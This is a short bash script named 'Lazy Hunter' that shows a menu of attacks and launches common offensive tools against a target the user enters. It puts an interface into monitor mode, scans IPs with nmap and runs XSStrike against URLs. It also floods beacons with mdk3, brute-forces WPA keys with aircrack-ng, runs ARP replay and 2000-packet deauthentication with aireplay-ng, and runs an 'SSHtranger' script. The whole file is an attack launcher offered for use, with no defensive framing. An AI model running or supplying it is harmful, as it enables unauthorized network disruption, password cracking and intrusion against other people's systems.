figlet Lazy
figlet Hunter 
red="\033[35;1m"
echo -e $red"1-Put In Interface In Mon0"
echo -e $red"2-Scan Target IP"
echo -e $red"3-XSS Attack"
echo -e $red"4-Scan For Wifi Target"
echo -e $red"5-Passive Attack"
echo -e $red"6-Beacon DDoS"
echo -e $red"7-WPA BruteForce"
echo -e $red"8-Replay Attack"
echo -e $red"9-Deauth Attack"
echo -e $red"10-SSHtranger Attack"  

read -p " [>Attacks<] " attacks
if [ $attacks = "1" ] 
then
read -p " (>Interface<) " inter
airmon-ng start $inter
fi

if [ $attacks = "2" ] 
then
read -p " (>IP-Target<) " target1 
nmap $target1
fi

if [ $attacks = "3" ] 
then
cd $HOME/LazyHunter/XSStrike/
read -p " (>URL-Target<) " target2 
python3 xsstrike.py -u $target2 
fi

if [ $attacks = "4" ] 
then
read -p " (>Interface<) " inter2 
airodump-ng start $inter2 
fi

if [ $attacks = "5" ] 
then
read -p " (>Interface<) " inter3 
airodump-ng -w data $inter3 
fi

if [ $attacks = "6" ]
then
read -p " (>Interface<) " inter4 
mdk3 $inter4 a 
fi

if [ $attacks = "7" ] 
then
read -p " (>BSSID<) " target3
read -p " (>Wordlist<) " word1 
aircrack-ng -a 2 -b $target3 -w $word1 
fi

if [ $attacks = "8" ] 
then
read -p " (>BSSID<) " target5 
read -p " (>Interface<) " inter5 
aireplay-ng --arpreplay -b $target5 $inter5 
fi

if [ $attacks = "9" ] 
then
read -p " (>Interface<) " inter6
aireplay-ng --deauth 2000 $inter6 
fi

if [ $attacks = "10" ]
then
read -p " (>IP-Target<) " target6 
cd $HOME/LazyHunter/
python2 SSHtranger.py $target6
fi

if [ $attacks = "exit" ] 
then
clear
fi
 